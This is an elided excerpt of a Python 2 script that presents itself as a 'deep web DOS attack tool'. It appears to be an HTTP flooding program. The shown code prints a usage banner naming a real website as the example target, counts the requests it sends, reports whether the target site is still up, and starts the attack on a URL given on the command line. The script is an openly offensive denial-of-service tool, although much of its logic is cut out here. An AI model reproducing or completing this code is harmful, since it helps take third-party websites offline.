...
def usage():
    print ' DEEP WEB DOS ATTACK TOOL '
    print '      MADE BY Lu0R1T1     '
    print '????????HOW TO USE????????'
    print 'Example: LuDosATK.py http://www.google.com/'
    print "\a"
print \
"""
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
 			print 'Can not send packets web maybe down!'
			code=500
	...
	def run(self):
		...
		while flag==0:
			if (previous+150<request_counter) & (previous<>request_counter):
				print "Successfully sent %d packets web still alive" % (request_counter)
				previous=request_counter
		if flag==2:
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "Attack will be start in a few second"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
